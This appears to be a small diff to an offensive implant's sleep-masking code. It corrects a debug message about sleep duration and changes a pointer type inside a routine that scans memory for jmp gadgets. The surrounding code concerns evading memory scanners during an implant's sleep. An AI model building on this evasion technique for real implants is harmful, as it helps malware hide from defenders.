@@ -21,7 +21,7 @@ auto DECLFN Mask::Main(
         RndTime = Self->Session.SleepTime;
     }
 
-    KhDbg( "sleep during: %d seconds", RndTime % 1000 );
+    KhDbg( "sleep during: %d ms", RndTime );
 
     switch( this->Ctx.TechniqueID ) {
     case MaskTimer:
@@ -40,7 +40,7 @@ auto DECLFN Mask::FindGadget(
     _In_ UINT16 RegValue
 ) -> UPTR {
     UPTR   Gadget      = 0;
-    PBYTE  SearchBase  = NULL;
+    BYTE*  SearchBase  = NULL;
     SIZE_T SearchSize  = 0;
     UINT16 JmpValue    = 0xff;
 
